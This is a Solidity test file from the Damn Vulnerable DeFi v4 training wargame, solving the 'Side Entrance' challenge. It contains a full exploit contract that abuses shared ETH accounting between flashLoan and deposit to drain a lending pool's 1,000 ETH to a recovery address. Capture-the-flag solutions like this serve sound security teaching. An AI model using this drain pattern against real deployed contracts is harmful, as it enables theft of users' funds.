// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool, IFlashLoanEtherReceiver, SafeTransferLib} from "../../src/side-entrance/SideEntranceLenderPool.sol";

/**
 * @notice Exploit contract for Challenge 4: Side Entrance.
 * @dev Exploits Cross-Function Reentrancy / Shared ETH Accounting between `flashLoan()` and `deposit()`.
 */
contract SideEntranceExploit is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;
    address private immutable recovery;

    constructor(address _recovery) {
        recovery = _recovery;
    }

    function execute() external payable {
        // Walk to Window 2 and deposit the borrowed ETH into our Savings Account!
        // This restores `address(pool).balance` to 1,000 ETH (satisfying `flashLoan`)
        // while crediting `balances[address(this)] = 1,000 ETH`!
        pool.deposit{value: msg.value}();
    }

    function attack(SideEntranceLenderPool _pool) external {
        pool = _pool;

        // Walk to Window 1 and borrow all the ETH from the bank!
        pool.flashLoan(address(pool).balance);

        // Walk to Window 3 and withdraw all the ETH from our Savings Account!
        pool.withdraw();

        // Walk to Window 4 and send all the ETH to our recovery account!
        // Note: In production, prefer `SafeTransferLib.safeTransferETH(recovery, address(this).balance)`
        // or `.call{value: ...}("")` over `.transfer()` to avoid the 2,300 gas stipend limit.
        SafeTransferLib.safeTransferETH(recovery, address(this).balance);
    }

    // Required mailbox to accept native ETH when `pool.withdraw()` sends ETH back to this contract
    receive() external payable {}
}

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        new SideEntranceExploit(recovery).attack(pool);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}
